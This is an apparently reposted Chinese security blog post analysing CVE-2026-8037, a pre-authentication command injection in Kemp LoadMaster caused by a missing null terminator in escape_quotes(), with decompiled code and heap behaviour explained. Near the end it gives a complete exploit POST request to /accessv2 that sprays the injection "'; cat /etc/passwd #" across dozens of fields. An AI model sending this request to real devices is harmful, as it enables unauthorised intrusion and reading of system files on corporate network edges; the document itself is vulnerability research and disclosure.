#  企业技术，壳破而入：Kemp LoadMaster 未初始化堆漏洞分析  
 幻泉之洲   2026-07-01 02:12  
  
>   
  
## Kemp LoadMaster 是什么，CVE-2026-8037 是怎么回事  
  
Progress 这家公司不止有 MoveIT，还卖负载均衡器 Kemp LoadMaster。这玩意儿常部署在企业网络边缘，负责四层和七层流量管理、SSL 卸载、健康检查，还自带 WAF。  
  
官方原话是：“可以确保应用高度可用、响应迅速、可扩展”。听上去很稳，但现实是边缘设备经常变成攻击入口。CVE-2026-8037 就是新例子：一个预认证 RCE，能打 API 的人就能利用。  
  
6 月 4 号 Progress 发了公告[1]，定性是“命令注入远程代码执行漏洞”。影响范围：GA v7.2.63.1 及更早、LTSF v7.2.54.17 及更早，前提是 API 开着。  
## 场景搭建：两个版本之间到底改了什么  
  
分析用到了 7.2.63.1（有问题）和 7.2.63.2（修过的），比对 access 可执行文件。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tbTbtBE6TibeCB2wKxvAFC7yl3K9khutpn9SfsLkOmxdAqpNEI7mrQGcKtfWkktqh6QdiaD7icyYXHBWyCxrBDRJah6jgmpzu9CKq1icE43nYHk/640?wx_fmt=png&from=appmsg "")  
  
改动很小，就一个函数：escape_quotes()。我一开始也以为是简单命令注入，结果补丁没加任何新转义。这就怪了。  
  
先看漏洞版本的实现：  
  
_BYTE *__fastcall escape_quotes(const char *user_input) // vulnerable version{  const char *v1; // rbx  char *v2; // rdx  _BYTE *result; // rax  char v4; // cl  _BYTE *i; // rdx  v1 = user_input;  if ( !user_input )    return nullptr;  v2 = strchr(user_input, '\'');  result = user_input;  if ( v2 )  {    result = malloc(3 * (strlen(user_input) + 1) + 29);    if ( result )    {      v4 = *user_input;      if ( *user_input )      {        for ( i = result; ; ++i )        {          if ( v4 == "'" )          {            *i = '\'';            i[1] = '\\';            i[2] = '\'';            i += 3;          }          *i = *v1++;          v4 = *v1;          if ( !*v1 )            break;        }      }    }  }  return result;}  
  
escape_quotes() 只做一件事：把输入里的单引号转义成 '\'' 这种 shell 能理解的格式。如果没单引号，原样返回指针；有单引号，就 malloc 一块新内存，写入转义后的结果。  
  
逻辑本身没毛病，问题出在哪儿呢？分配和拷贝之后的缓冲区末尾没有显式置零。换句话说，返回的堆内存可能残留着之前释放的脏数据。  
  
再看修补后的版本，我们故意不展示了，因为就加了一行：在返回前给缓冲区末尾写了个空字符。对，就这么敷衍。  
## 未初始化的堆，何止是垃圾数据  
  
不熟悉堆行为的人可能觉得，没清空的缓冲区顶多输出一些垃圾。我们写个小例子验证一下：分配三个 0x20 大小的缓冲区，分别填充 A、B、C，然后全释放掉，再分配一个同样大小的，用 fprintf("%s\n") 打印。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/tbTbtBE6TibfWcO57eXBl6nbQrKSDoTmBLmoU8H6bos39ZS5uRu8ZsBrLZgJYYf1mglHzoFpBnCuXoOj3ShTNuicTViaghIyuGLK6ofbLXR71s/640?wx_fmt=png&from=appmsg "")  
  
因为 glibc 的 malloc 不初始化内存，第四块缓冲区的前 0x10 字节还残留着堆分配器的元数据（比如 tcache 的 next 指针和 key），后面才是我们之前写入的 C 字符。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/tbTbtBE6TibeVOaKERCB6zP4UT8Zz5dH3Effxtiaxx40X6OI50rgtfGoHdZlEWabzoOve306PTAxOcHCmv96DicPD256c5XnqnIVXEOkeGJl3Y/640?wx_fmt=png&from=appmsg "")  
  
fprintf 读到元数据里面的 null 字节就停了，所以只输出一串乱码。但如果我把前 0x10 字节覆盖掉，比如全写成 x，那 %s 就会继续读越界，把后面相邻释放块里的 C 字符一并带出来。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/tbTbtBE6Tibf1Ka4KnkOfJ8Vk5Sy8r3wpiacPB7Np5vRP85CXBjuvL3eACXT2gZgLLGdIWWxz7nb99icvOhUjlybX7qso1MMWRnNtlwOaTRj9M/640?wx_fmt=png&from=appmsg "")  
  
这个行为就是漏洞利用的关键。  
## 回到漏洞现场：把未初始化变成 RCE  
  
LoadMaster 的 /accessv2 端点会调用一个函数来验证 API 账号密码。大致逻辑是这样：  
  
__int64 __fastcall sub_43B080(__int64 a1, __int64 a2, const char *a3){  const char *v4; // r12  const char *v5; // r9  const char *v6; // r8  bool v7; // zf  __int64 result; // rax  if ( !a1 || !a2 )    return 0;  v4 = (const char *)escape_quotes(a2);  v5 = (const char *)escape_quotes(a1);  v6 = "";  if ( fips )    v6 = (const char *)&unk_46DFA8;  __sprintf_chk(a3, 1, -1, "validuser -b %s -u '%s' -p '%s'", v6, v5, v4);  v7 = system(a3) == 0;  result = 0;  if ( v7 )    return a1;  return result;}  
  
正常请求发过去，最终执行的是：  
  
sh -c validuser -b -u 'AAAAA' -p 'QkJCQkI='  
  
apiuser 对应 -u 参数，经过 escape_quotes() 转义，理论上单引号被处理了，没法简单 breakout。  
  
但是，因为转义后的缓冲区没以 null 终止，__sprintf_chk 在拼接字符串时会继续读到相邻的释放块。如果那块内存里刚好有我们喷进去的 payload，而且开头没有 null 字节阻断，命令就能注入成功。  
  
问题在于：释放块的头部有分配器元数据，通常包含 null，会提前终止读取。怎么干掉元数据？靠单引号扩展。  
  
一个单引号转义后变成四个字节 '\''。如果我们发四个单引号 ''''，正好扩展成 16 个字节，刚好覆盖相邻释放块的前 0x10 字节（元数据区域）。  
  
也就是说，apiuser 里放 ''''，利用转义膨胀把隔壁块的 next 指针和 key 全部刷掉，让 __sprintf_chk 的读取不再被 null 截断，一路冲进我们提前喷洒好的 payload 里。  
  
喷洒怎么搞？请求体的 JSON 里有大量键值对，解析过程会反复分配堆内存。我们在请求里塞几十个 g0 到 g60 之类的字段，值里带上命令注入字符串（比如 '; cat /etc/passwd #）。多喷几次，命中的概率就很高。  
## 完整的利用请求长这样  
  
下面就是一发入魂的 POST 请求：  
  
POST /accessv2 HTTP/1.1Accept-Encoding: gzip, deflate, brContent-Length: 2913Host: 192.168.5.30:443Content-Type: application/jsonAccept: */*Connection: keep-alive{"cmd": "getall", "apiuser": "''''", "apipass": "BBBBB", "g0": "AAAAAAAAAAAAAAAA'; cat /etc/passwd #", "g1": "AAAAAAAAAAAAAAAA'; cat /etc/passwd #", ...（中间略）..., "g60": "AAAAAAAAAAAAAAAA'; cat /etc/passwd #"}  
  
结果嘛，passwd 文件就出来了。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/tbTbtBE6Tibfzzkz1V9Am1r5WaAgnmEa1ibmia9crIDlLjBGDNa3Olia0cVYibibaND2lz7X92jqKpwsQGqgXW9AdaWjG5bwqgaEpm2DvtcT2sMic8/640?wx_fmt=png&from=appmsg "")  
  
这个利用干净利落，不依赖复杂的堆风水，纯粹是靠未初始化行为和信息泄漏的叠加。补丁只加了一个 \0，简单粗暴，但确实有效。  
  
整个研究来自 watchTowr Labs[2]，他们背后的平台做的是持续性自动化红队演练和外部攻击面管理，专门针对真实攻击者正在利用的漏洞做测试。这种从实际漏洞反推利用思路的方法，比只跑扫描器厂商的告警有价值得多。  
### 参考资料  
  
[1]   
https://community.progress.com/s/article/LoadMaster-Critical-Security-Bulletin-June-2026-CVE-2026-8037-CVE-2026-33691?ref=labs.watchtowr.com  
  
[2]   
https://watchtowr.com/  
  
[3]   
https://labs.watchtowr.com/enterprise-tech-in-shell-out-progress-kemp-loadmaster-uninitialized-heap-to-pre-auth-rce-cve-2026-8037/  
  
